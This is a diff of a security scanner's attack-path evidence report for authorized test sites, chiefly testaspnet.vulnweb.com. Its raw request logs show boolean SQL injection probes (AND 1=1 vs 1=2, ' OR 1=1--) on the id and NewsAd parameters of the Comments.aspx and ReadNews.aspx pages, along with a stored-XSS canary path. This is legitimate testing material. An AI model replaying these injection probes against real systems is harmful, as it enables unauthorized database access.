@@ -1,204 +1,18 @@
-# SENTINEL v4.3.0 — L2 Attack Path Intelligence: LIVE EVIDENCE REPORT
+# SENTINEL v4.3.0 — L2 Attack Path Intelligence: LIVE EVIDENCE REPORT (round 7)
 
-Generated from live scan results of the authorized targets (testaspnet, ginjuice, gruyere2, testasp). gruyere2 and testasp are FRESH v4.3.0 live scans (attack paths integrated in the pipeline). testaspnet and ginjuice are v4.3.0 L2 projections over their REAL v4.2.3 live journals (this environment kills background processes and caps foreground calls at 600s; those scans take 936s/620s — the engine is verdict-identical per the gates and L2 is a zero-request pure projection; a fresh ginjuice re-scan attempt overran the window and was discarded). Every path is classified by the weakest-link rule: a path is VERIFIED only when ALL seven links (Identity, Entry, Action, Object, Authorization, State, Impact) trace to verified evidence — finding records, raw request-journal entries, twin rows, scan artifacts. Any inferred link makes the whole path INFERRED and the weak links are named. This report replays the saved journals; it sends zero requests.
-
-
-**TOTAL: 21 paths — 19 VERIFIED / 2 INFERRED**
+Every attack path in this report rests on FRESH LIVE evidence — request/response pairs actually sent to the live authorized target in the scan named at the top of its section. gruyere2 and testasp carry their round-6 fresh v4.3.0 full live scans (re-confirmed this round: the shipped apath layer rebuilt their paths byte-identically from their own journals, every journal is a single-scan window, every citation is a literal slice). ginjuice and testaspnet carry round-7 TARGETED fresh live scans of exactly the attack-path surfaces (supervisor order: no projections over old logs — the shipped pipeline ran with discovery scoped to those surfaces; stats.crawl.targeted_mode inside each file records the seeds and keep-rules). Paths that could not be fresh-verified are NOT hidden: they are listed in the not-fresh-verified register with the measured reason. Every path is classified by the weakest-link rule: a path is VERIFIED only when ALL seven links (Identity, Entry, Action, Object, Authorization, State, Impact) trace to verified evidence — finding records, raw request-journal entries, twin rows, scan artifacts. Any inferred link makes the whole path INFERRED and the weak links are named. This report replays the saved journals; it sends zero requests.
 
 
-## testaspnet — http://testaspnet.vulnweb.com (run run-3d6cf53f93, scanner sentinel-core/4.2.3)
+## testaspnet — http://testaspnet.vulnweb.com (run run-4fe17c44cc, scanner sentinel-core/4.3.0)
 
-**L2 SOURCE (honesty note): v4.3.0 L2 projection over the v4.2.3 live journal (run-3d6cf53f93, seed f09afb0f) — the engine is verdict-identical (gate verdict-diff vs frozen v4.2.2 = NONE) and L2 is a zero-request pure projection; this environment cannot host a >600s fresh re-scan of this target (measured 936s in the v4.2.3 re-gate)**
+**L2 SOURCE (honesty note): fresh TARGETED v4.3.0 live scan (run-4fe17c44cc, seed l2fresh-tn-r7) of ONLY the L2 attack-path surfaces (supervisor round-7 order: fresh-live evidence, no projections) — the shipped pipeline ran with discovery seeded to the exact path-surface pages and the endpoint map scoped to those surfaces (stats.crawl.targeted_mode records the seeds/keep-rules); every request/response pair in this journal was sent live in this run (2026-10-04T11:38:42Z .. 2026-10-04T11:46:55Z, 493s wall)**
 
-**3 paths: 2 VERIFIED / 1 INFERRED** (3 single-finding, 0 chains) — weak-link histogram: `{'impact': 1}`
-
-Seeds used: `F-1e2f9fefe2, F-9779edbacd, F-c9596a7ab3`; non-seed findings (annotation-only classes): `{"F-028c119c10": "missing_security_headers", "F-1142a7221c": "missing_security_headers", "F-1179beef92": "missing_security_headers", "F-13b2c8c2a8": "missing_security_headers", "F-32a08b078e": "missing_security_headers", "F-39effc085b": "missing_security_headers", "F-3a113ff26c": "tech_banner_disclosure", "F-3c3fb037b5": "server_banner_disclosure", "F-460fea73c9": "server_banner_disclosure", "F-605837d876": "server_banner_disclosure", "F-67c25444e0": "tech_banner_disclosure", "F-68f8ce2ff9": "tech_banner_disclosure", "F-6b7f543b49": "tech_banner_disclosure", "F-7ce7cf9eb3": "tech_banner_disclosure", "F-8a1b90f978": "tech_banner_disclosure", "F-8ff2447e2a": "missing_security_headers", "F-929f619d34": "missing_security_headers", "F-9493228d1f": "server_banner_disclosure", "F-97d24e17d0": "server_banner_disclosure", "F-a16bca31ac": "tech_banner_disclosure", "F-a8e5a44043": "tech_banner_disclosure", "F-c05541d788": "tech_banner_disclosure", "F-da42e6ee73": "server_banner_disclosure", "F-e149aac978": "missing_security_headers", "F-e625aa0ffd": "server_banner_disclosure", "F-f14e193287": "server_banner_disclosure", "F-fbb6de6abd": "server_banner_disclosure"}`
+**2 paths: 1 VERIFIED / 1 INFERRED** (2 single-finding, 0 chains) — weak-link histogram: `{'impact': 1}`
 
 
-### AP-8876b898b5 — VERIFIED — sql_injection at /Comments.aspx — single-finding path
-*Every link below carries verified evidence. The path is fully proven.*
+**TOTAL: 20 paths — 18 VERIFIED / 2 INFERRED** (all fresh-live evidence; the one path that could not be fresh-verified is in the register below)
 
-findings: F-c9596a7ab3 | chain_rule: — | mitigations absent: []
-
-| Link | Status | Statement |
-|---|---|---|
-| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
-| **entry** | verified | GET http://testaspnet.vulnweb.com/Comments.aspx — parameter id |
-| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
-| **object** | verified | the SQL query evaluation (a read-capable oracle) |
-| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
-| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
-| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |
-
-<details><summary>raw evidence, link by link</summary>
-
-
-**[IDENTITY] — verified**
-
-  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request
-
-  - `journal` ref `req-f3b98e1c` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
-    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-    RESPONSE 200
-      cache-control: private
-      content-type: text/html; charset=utf-8
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:58:24 GMT
-      content-length: 23962
-      body[0:200]: 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
-<HTML>
-	<HEAD>
-		<title>Comments</title>
-		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
-		<meta name="CODE_
-  - `journal` ref `req-983f2414` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly`
-    REQUEST  GET http://testaspnet.vulnweb.com
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-    RESPONSE 200
-      cache-control: private
-      content-type: text/html; charset=utf-8
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      set-cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:57:47 GMT
-      content-length: 14044
-      body[0:200]: 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
-<HTML>
-	<HEAD>
-		<title>acublog news</title>
-		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">
-		<meta
-  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-
-**[ENTRY] — verified**
-
-  GET http://testaspnet.vulnweb.com/Comments.aspx — parameter id
-
-  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-  - `journal` ref `req-05cdddac` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1`
-    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-    RESPONSE 200
-      cache-control: private
-      content-type: text/html; charset=utf-8
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:58:22 GMT
-      content-length: 23962
-      body[0:200]: 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
-<HTML>
-	<HEAD>
-		<title>Comments</title>
-		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
-		<meta name="CODE_
-
-**[ACTION] — verified**
-
-  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes
-
-  - `finding` ref `F-c9596a7ab3` excerpt: `verification: oracle:replay-2round (passed=True)`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-  - `journal` ref `req-05cdddac` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1`
-    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-    RESPONSE 200
-      cache-control: private
-      content-type: text/html; charset=utf-8
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:58:22 GMT
-      content-length: 23962
-      body[0:200]: 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
-<HTML>
-	<HEAD>
-		<title>Comments</title>
-		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
-		<meta name="CODE_
-
-**[OBJECT] — verified**
-
-  the SQL query evaluation (a read-capable oracle)
-
-  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-
-**[AUTHORIZATION] — verified**
-
-  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
-
-  - `journal` ref `req-05cdddac` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
-    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
-    RESPONSE 200
-      cache-control: private
-      content-type: text/html; charset=utf-8
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:58:22 GMT
-      content-length: 23962
-      body[0:200]: 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
-<HTML>
-	<HEAD>
-		<title>Comments</title>
-		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
-		<meta name="CODE_
-  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-
-**[STATE] — verified**
-
-  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested
-
-  - `finding` ref `F-c9596a7ab3` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-
-**[IMPACT] — verified**
-
-  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
-
-  - `finding` ref `F-c9596a7ab3` excerpt: `impact grade=proven; chain: oracle:replay-2round on GET http://testaspnet.vulnweb.com/Comments.aspx`
-    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
-      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
-      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-
-</details>
+Seeds used: `F-1e2f9fefe2, F-9779edbacd`; non-seed findings (annotation-only classes): `{"F-1142a7221c": "missing_security_headers", "F-1179beef92": "missing_security_headers", "F-13b2c8c2a8": "missing_security_headers", "F-160af642d6": "tech_banner_disclosure", "F-32a08b078e": "missing_security_headers", "F-39effc085b": "missing_security_headers", "F-3a113ff26c": "tech_banner_disclosure", "F-3c3fb037b5": "server_banner_disclosure", "F-460fea73c9": "server_banner_disclosure", "F-54964f988a": "server_banner_disclosure", "F-605837d876": "server_banner_disclosure", "F-67c25444e0": "tech_banner_disclosure", "F-6b7f543b49": "tech_banner_disclosure", "F-8a1b90f978": "tech_banner_disclosure", "F-8ff2447e2a": "missing_security_headers", "F-929f619d34": "missing_security_headers", "F-9493228d1f": "server_banner_disclosure", "F-97d24e17d0": "server_banner_disclosure", "F-a16bca31ac": "tech_banner_disclosure", "F-a8e5a44043": "tech_banner_disclosure", "F-b1f0e6f0a0": "missing_security_headers", "F-c05541d788": "tech_banner_disclosure", "F-da42e6ee73": "server_banner_disclosure", "F-fbb6de6abd": "server_banner_disclosure"}`
 
 
 ### AP-a5d1a4b1d8 — VERIFIED — sql_injection at /ReadNews.aspx — single-finding path
@@ -208,7 +22,7 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 
 | Link | Status | Statement |
 |---|---|---|
-| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
+| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-1ceda0b5 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
 | **entry** | verified | GET http://testaspnet.vulnweb.com/ReadNews.aspx — parameter id |
 | **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
 | **object** | verified | the SQL query evaluation (a read-capable oracle) |
@@ -221,38 +35,30 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 
 **[IDENTITY] — verified**
 
-  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request
+  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-1ceda0b5 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request
 
-  - `journal` ref `req-56d842f1` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
-    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
+  - `journal` ref `req-67069757` excerpt: `ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj`
+    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=2%27+OR+1%3D1--
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
+    RESPONSE 200
+      cache-control: private
+      content-length: 0
+      server: Microsoft-IIS/8.5
+      x-aspnet-version: 2.0.50727
+      x-powered-by: ASP.NET
+      date: Sun, 04 Oct 2026 11:39:47 GMT
+  - `journal` ref `req-1ceda0b5` excerpt: `ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj; path=/; HttpOnly`
+    REQUEST  GET http://testaspnet.vulnweb.com/
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
     RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
+      set-cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj; path=/; HttpOnly
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:09:00 GMT
-      content-length: 13444
-      body[0:200]: 
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
-<HTML>
-	<HEAD>
-		<title>ReadNews</title>
-		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
-		<meta content="C#
-  - `journal` ref `req-983f2414` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly`
-    REQUEST  GET http://testaspnet.vulnweb.com
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-    RESPONSE 200
-      cache-control: private
-      content-type: text/html; charset=utf-8
-      server: Microsoft-IIS/8.5
-      x-aspnet-version: 2.0.50727
-      set-cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly
-      x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 22:57:47 GMT
+      date: Sun, 04 Oct 2026 11:38:41 GMT
       content-length: 14044
       body[0:200]: 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
@@ -261,35 +67,33 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 		<title>acublog news</title>
 		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">
 		<meta
-  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
+  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 22909B vs 13505B on condition flip`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
 
 **[ENTRY] — verified**
 
   GET http://testaspnet.vulnweb.com/ReadNews.aspx — parameter id
 
-  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
+  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 22909B vs 13505B on condition flip`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-  - `journal` ref `req-030bacc1` excerpt: `http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2`
-    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
+  - `journal` ref `req-07b9b0fc` excerpt: `http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=1%27+OR+1%3D2--`
+    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=1%27+OR+1%3D2--
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
     RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:08:57 GMT
-      content-length: 13444
+      date: Sun, 04 Oct 2026 11:39:16 GMT
+      content-length: 22877
       body[0:200]: 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
 <HTML>
@@ -304,22 +108,21 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-1e2f9fefe2` excerpt: `verification: oracle:replay-2round (passed=True)`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
-  - `journal` ref `req-030bacc1` excerpt: `http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2`
-    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
+  - `journal` ref `req-07b9b0fc` excerpt: `http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=1%27+OR+1%3D2--`
+    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=1%27+OR+1%3D2--
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
     RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:08:57 GMT
-      content-length: 13444
+      date: Sun, 04 Oct 2026 11:39:16 GMT
+      content-length: 22877
       body[0:200]: 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
 <HTML>
@@ -332,29 +135,28 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 
   the SQL query evaluation (a read-capable oracle)
 
-  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
+  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 22909B vs 13505B on condition flip`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
 
 **[AUTHORIZATION] — verified**
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
 
-  - `journal` ref `req-030bacc1` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
-    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
+  - `journal` ref `req-07b9b0fc` excerpt: `ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj`
+    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&NewsAd=1%27+OR+1%3D2--
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Cookie: ASP.NET_SessionId=ysup5kzfywwgqevxvndsaiuj
     RESPONSE 200
       cache-control: private
       content-type: text/html; charset=utf-8
       server: Microsoft-IIS/8.5
       x-aspnet-version: 2.0.50727
       x-powered-by: ASP.NET
-      date: Sat, 03 Oct 2026 23:08:57 GMT
-      content-length: 13444
+      date: Sun, 04 Oct 2026 11:39:16 GMT
+      content-length: 22877
       body[0:200]: 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
 <HTML>
@@ -362,11 +164,10 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 		<title>ReadNews</title>
 		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
 		<meta content="C#
-  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
+  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 22909B vs 13505B on condition flip`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
 
 **[STATE] — verified**
@@ -375,9 +176,8 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-1e2f9fefe2` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
 
 **[IMPACT] — verified**
@@ -386,9 +186,8 @@ findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-1e2f9fefe2` excerpt: `impact grade=proven; chain: oracle:replay-2round on GET http://testaspnet.vulnweb.com/ReadNews.aspx`
     finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
-      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
-      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 22909B vs 13505B on condition flip
+      evidence[response_diff]: body-size differential 30554B vs 13444B on condition flip
       verification: oracle:replay-2round passed=True conf=0.95 rounds=2
 
 </details>
@@ -401,7 +200,7 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
 
 | Link | Status | Statement |
 |---|---|---|
-| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
+| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-1ceda0b5 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
 | **entry** | verified | POST http://testaspnet.vulnweb.com/Comments.aspx — parameter tbComment |
 | **action** | verified | canary markup submitted through the real form (all form fields ridden verbatim) and persisted server-side |
 | **object** | verified | the persisted message record (the canary survived an independent re-fetch — the record exists server-side) |
@@ -414,30 +213,38 @@ findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-securit
 
 **[IDENTITY] — verified**
 
-  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request
+  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-1ceda0b5 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request
 
